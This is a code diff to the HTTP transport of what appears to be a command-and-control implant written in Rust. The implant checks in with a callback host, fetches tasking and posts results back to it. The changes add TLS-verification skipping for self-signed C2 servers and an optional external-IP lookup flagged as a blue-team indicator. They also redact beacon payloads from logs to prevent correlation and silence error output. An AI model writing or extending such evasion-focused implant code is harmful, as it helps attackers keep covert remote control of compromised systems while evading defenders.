@@ -25,6 +25,20 @@ pub struct HttpProfile {
     pub proxy_port: String,
     pub proxy_user: String,
     pub query_path_name: String,
+    /// When true, skip TLS certificate verification (default for C2 self-signed
+    /// certs). Set to false in production / over monitored networks to detect
+    /// MITM via cert chain mismatches.
+    #[serde(default = "default_true")]
+    pub insecure_skip_tls_verify: bool,
+    /// When true, query icanhazip.com (over HTTPS) at check-in to populate
+    /// the callback's external_ip field. Off by default — the egress is a
+    /// strong blue-team indicator.
+    #[serde(default)]
+    pub external_ip_check: bool,
+}
+
+fn default_true() -> bool {
+    true
 }
 
 
@@ -40,7 +54,33 @@ fn url_encode(s: &str) -> String {
         .collect()
 }
 
+/// Truncate the query string of a URL for debug logs. The query string
+/// contains the AES-encrypted payload, which is deterministic per (PSK, IV)
+/// pair — printing it in full would let observers correlate beacons without
+/// holding the PSK.
+fn redact_url(url: &str) -> String {
+    if let Some(q) = url.find('?') {
+        let path = &url[..q];
+        let qs = &url[q + 1..];
+        if qs.len() <= 64 {
+            format!("{path}?<{}_bytes_redacted>", qs.len())
+        } else {
+            format!("{path}?{}…<{} bytes redacted>", &qs[..48], qs.len())
+        }
+    } else {
+        url.to_string()
+    }
+}
+
 impl HttpProfile {
+    pub fn insecure_skip_tls_verify(&self) -> bool {
+        self.insecure_skip_tls_verify
+    }
+
+    pub fn external_ip_check(&self) -> bool {
+        self.external_ip_check
+    }
+
     fn build_get_url(&self, packed: &str) -> String {
         format!(
             "{}:{}/{}?{}={}",
@@ -99,10 +139,20 @@ impl C2Transport for HttpProfile {
     fn checkin(&self, packed: &str) -> Result<String> {
         let url = self.build_get_url(packed);
         if DEBUG.load(Ordering::Relaxed) {
-            info!("[C2] checkin GET {}", &url);
+            info!("[C2] checkin GET {}", redact_url(&url));
         }
-        let resp = http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None).map_err(|e| {
-            eprintln!("[C2] checkin error: {e}");
+        let resp = http_request(
+            &url,
+            "GET",
+            Some(&self.headers),
+            self.proxy_url().as_deref(),
+            None,
+            self.insecure_skip_tls_verify(),
+        )
+        .map_err(|e| {
+            if DEBUG.load(Ordering::Relaxed) {
+                eprintln!("[C2] checkin error: {e}");
+            }
             e
         })?;
         if DEBUG.load(Ordering::Relaxed) {
@@ -114,9 +164,16 @@ impl C2Transport for HttpProfile {
     fn get_tasking(&self, packed: &str) -> Result<String> {
         let url = self.build_get_url(packed);
         if DEBUG.load(Ordering::Relaxed) {
-            info!("[C2] get_tasking GET {}", &url);
+            info!("[C2] get_tasking GET {}", redact_url(&url));
         }
-        http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None)
+        http_request(
+            &url,
+            "GET",
+            Some(&self.headers),
+            self.proxy_url().as_deref(),
+            None,
+            self.insecure_skip_tls_verify(),
+        )
     }
 
     fn post_response(&self, packed: &str) -> Result<String> {
@@ -125,8 +182,15 @@ impl C2Transport for HttpProfile {
             self.callback_host, self.callback_port, self.post_uri
         );
         if DEBUG.load(Ordering::Relaxed) {
-            info!("[C2] post_response POST {}", &url);
+            info!("[C2] post_response POST {}", redact_url(&url));
         }
-        http_request(&url, "POST", Some(&self.headers), self.proxy_url().as_deref(), Some(packed))
+        http_request(
+            &url,
+            "POST",
+            Some(&self.headers),
+            self.proxy_url().as_deref(),
+            Some(packed),
+            self.insecure_skip_tls_verify(),
+        )
     }
 }
